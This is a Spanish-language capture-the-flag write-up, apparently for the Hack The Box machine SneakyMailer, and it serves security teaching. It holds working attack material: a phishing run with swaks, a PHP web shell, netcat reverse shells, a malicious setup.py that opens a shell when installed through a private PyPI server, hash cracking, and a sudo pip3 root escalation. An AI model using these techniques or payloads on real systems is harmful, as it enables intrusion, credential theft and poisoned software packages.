---
layout: post
title: HTB_SneakyMailer
date: 2023/07/10
slug: HTB_SneakyMailer
heroImage: /assets/machines.jpg
---

# SneakyMailer {-}

## Introduccion {-}

La maquina del dia 26/07/2021 se llama SneakyMailer
.

El replay del live se puede ver en [Twitch: S4vitaar SneakyMailer maquina](https://www.twitch.tv/videos/1098850596)
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.197
```
ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.197 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,25,80,143,993,8080 10.10.10.197 -oX targetedXML
```


|Puerto|Servicio    | Que se nos occure?                  |    Que falta?      |
|------|------------|-------------------------------------|--------------------|
|21    |ftp         |Conexion como Anonymous              |                    |
|22    |ssh         |Accesso directo                      |usuario y contraseña|
|25    |smtp        |Por detras hay algo rel. email       |                    |
|80    |http        |Redirect to sneakycorp.htb hosts     |                    |
|143   |IMAP        |Connectar para listar contenido mail |usuario y contraseña|
|993   |squid-proxy |Browsear la web por este puerot      |Checkear el exploit |
|8080  |http        |Browsear la web por este puerto      |Checkear la web     |


#### FTP {-}

Intentamos conectarnos como anonymous.

```bash
ftp 10.10.10.197
> Name : anonymous
```

#### Whatweb {-}

```bash
whatweb http://10.10.10.197
```

Hay un redirect a 
```bash
 sneakycorp.htb 
```


#### Add sneakycorp.htb host {-}

```bash
nano /etc/hosts
```


![hosts-seakycor](/assets/images/hosts-sneakycorp.png) 
#### Checkear la web del puerto 8080 {-}

Abrimos la web y vemos cosas:

- Ya estamos logeados
- Hay mensajes de collegasos, pinchamos pero no passa nada
- Proyecto pypi testeado a 80%
- Proyecto POP3 y SMTP testeado completamente
- Es possible installar modulos con pip en el servidor
- Hay un enlace a Team y vemos una lista de emails


#### Recuperar la lista de email con CURL {-}

```bash
curl -s -X GET "http://sneakycorp.htb/team.php" | html2text | grep "@" | awk 'NF{print $NF}' > email.txt
```

## Evaluacion de vulnerabilidades {-}

### Swaksear la lista de email {-}

Es comun que en algunos servicios mail, nos podemos conectar al servidor y enviar email con un correo que no existe bajo el servidor indicado. 
Se puede hacer con la herramienta **swaks**. Aqui lo hacemos por el puerto **25**

```bash
nc -nlvp 80
```

```bash
swaks --to $(cat email.txt | tr '\n' ',') --from "s4vitar@sneakymailer.htb" \
--header "Subject: EEEEEEEE" --body "OH DIOS MIO ES DIAMOND JACKSON -> http://10.10.14.20/diamondjackson.jpg" \
--server 10.10.10.197
```

Ya vemos que podemos enviar el mail y que ademas alguien a pinchado el enlace. Ademas como utilizamos **nc** y no **python**
podemos ver la data enviada en raw. En la data vemos que podemos ver el usuario, el email y su password en formato url encode.

```bash
php --interactive

> print urldecode()"firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"
```

Ya vemos la contraseña del usuario en texto claro.

Intentamos conectar por **SSH** y **FTP** pero nada

### Conectar por el IMAP con NC {-}

1. Logear por IMAP con NC

    ```bash
    nc 10.10.10.197 143

    A1 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
    #Output
    A1 OK LOGIN Ok.
    ```

1. Listar el contenido

    ```bash
    A2 LIST "" "*"
    ```
    
1. Seleccionar INBOX

    ```bash
    A3 SELECT "INBOX"
    ```

1. Seleccionar los mensajes enviados

    ```bash
    A4 SELECT "INBOX.Sent"
    ```

1. Seleccionar los items enviados

    ```bash
    A5 SELECT "INBOX.Sent Items"
    ```

1. Seleccionar lo que hay en la papelera

    ```bash
    A6 SELECT "INBOX.Deleted Items"
    ```

1. Vemos que hay dos elementos en los items enviados, los recuperamos

    ```bash
    A7 FETCH 1:2 BODY[]
    ```

En los bodys encontramos un un mensaje que pregunta para cambiar la contraseña del usuario developer poniendo 
y la contraseña original en texto claro.
En el otro mensaje otra vez hablan del servicio **Pypi**

Con el usuario y contraseña intentamos volver a conectar con **FTP**

### Conexion con FTP {-}

```bash
ftp 10.10.10.197

> Name: developer
> Password: contraseña
#Output
Connection succesful

dir
cd dev
dir
```

Aqui vemos el contenido de la web. Nos creamos la famosa 
```bash
 s4vishell.php 
```


```php
<?php
    echo "<pre>". shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

ahora con el ftp subimos el archivo.

```bash
put s4vishell.php
#Output
transfer complete
```

Controlamos en la web si vemos el fichero 
```bash
 http://sneakycorp.htb/s4vishell.php 
```
 pero tenemos un *404 NOT FOUND*.
Intentamos con otras url:

- 
```bash
 http://sneakycorp.htb/s4vishell.php 
```

- 
```bash
 http://10.10.10.197:8080/s4vishell.php 
```

- 
```bash
 http://10.10.10.197:8080/dev/s4vishell.php 
```


pero nada. Aqui pensamos en que podria tener otros subdominios.

### Descubrimientos de subdominios de dos formas {-}

#### Descubrimiento de subdominios con GOBUSTER {-}

```bash
gobuster vhost -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontramos el subdominio 
```bash
 dev.sneakycorp.htb 
```


#### Descubrimiento de subdominios con WFUZZ {-}

```bash
wfuzz -c -t 200 --hw=12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.sneakycorp.htb" http://10.10.10.197
```

Encontramos el subdominio 
```bash
 dev.sneakycorp.htb 
```


#### Retocamos en hosts {-}

```bash
nano /etc/hosts
```

```{r, echo = FALSE, fig.cap="hosts dev.sneakycorp.htb", out.width="90%"}
    knitr::include_graphics("images/hosts-dev-sneakycorp.png")

![hosts-dev-seakycor](/assets/images/hosts-dev-sneakycorp.png) 
Como aqui ya tenemos un nuevo dominio browseamos la web en 
```bash
 dev.sneakycorp.htb/s4vishell.php 
```
 y ahora si encontramos nuestra webshell.

- whoami con 
```bash
 dev.sneakycorp.htb/s4vishell.php?cmd=whoami 
```

- verificamos si estamos en un contenedor con 
```bash
 dev.sneakycorp.htb/s4vishell.php?cmd=hostname -I 
```


no es el caso y tenemos capacidad de remote code execution. Ahora intentamos ganar acceso al sistema.
## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell con s4vishell.php {-}

1. Escuchamos por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Ejecutamos una reverse shell 

    ```bash
    dev.sneakycorp.htb/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.20 443
    ```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Descubrimiento de la maquina {-}

```bash
ls -l
cd /home
cd low
ls -la
cd .ssh
ls
cat authorized_keys
ps -fawwx
```

Vemos la flag pero no podemos leerla. Huele a que nos tenemos que convertir al usuario **low**. Tambien vemos un recurso **Pypi** con
un fichero de credenciales tipo 
```bash
 .htpasswd 
```


```cat
cat /var/www/pypi.sneakycorp.htb/.htpasswd
```

Vemos la contraseña del usuarion **pypi**. La copiamos en la maquina de atacante y tratamos de romperla con **John**

Por ultimo se puede ver un nuevo subdominio llamado 
```bash
 pypi.sneakycorp.htb 
```
, lo introduzimos en el 
```bash
 /etc/hosts 
```


### Crackeo con John {-}

Copiamos el contenido del fichero .htpasswd en un fichero llamado hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Hemos podido crackear la contraseña del usuario pypi


### Descubrimiento de la configuration NGINX {-}

Intentando conectarnos a la web por el subdominio 
```bash
 pypi.sneakycorp.htb 
```
, vemos que hay una redirection automatica al domino normal.
Sabiendo que estamos en frente de un **NGINX**, analizamos como el reverse proxy esta configurado.

```bash
cd /etc/nginx
ls
cd sites-enabled
cat sneakycorp.htb
cat pypi.sneakycorp.htb
```

Hay ya vemos que para ir al subdominio 
```bash
 pypi.sneakycorp.htb 
```
 tenemos que pasar por el puerto **8080**, y efectivamente si browseamos
la web con 
```bash
 pypi.sneakycorp.htb:8080 
```
 ya podemos ver la web del **pypi server**

### Crear un packete malicioso para pypi {-}

Como el servicio pypi es un server que tiene conectividad con el exterior, podemos seguir lo siguientes pasos en la maquina de atacante.

```bash
mkdir pypi
cd !$
mkdir pwned
cd !$
touch __init__.py
touch setup.py
```

El fichero 
```bash
 __init__.py 
```
 se queda vacio y el contenido del 
```bash
 setup.py 
```
 seria el siguiente.

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.20",443))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

La idea aqui es que cuando el pypi server ejecute el setup.py, queremos que nos entable una reverse shell. El codigo
de la reverse shell es de **monkey pentester** y la hemos retocado para que vaya en el fichero 
```bash
 setup.py 
```
.

Configuramos el equipo para poder enviar el paquete al repositorio victima.

```bash
rm ~/.pypirc
vi ~/.pypirc
```

El contenido del fichero 
```bash
 .pypirc 
```
 seria

```bash
[distutils]
index-servers = remote

[remote]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

Ahora podemos enviarlo

1. Nos ponemos en escucha en el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos el paquete al pypi server

    ```bash
    python3 setup.py sdist upload -r remote
    ```

1. Tenemos una shell pero primero nos a ejecutado desde nuestro propio equipo

    - no ponemos una vez mas en escucha al puerto 443

        ```bash
        nc -nlvp 443
        ```

    - en el primero shell le damos a exit

Y ya esta

```bash
whoami
#Output
Law
```

Ya le podemos hacer un nuevo tratamiento de la TTY.

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
sudo -l
```

vemos aqui que podemos utilizar la heramienta pip3 con el privilegio del usuario root sin proporcionar contraseña.

Miramos en [GTFOBINS](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip3 install $TF

whoami
#Output
root
```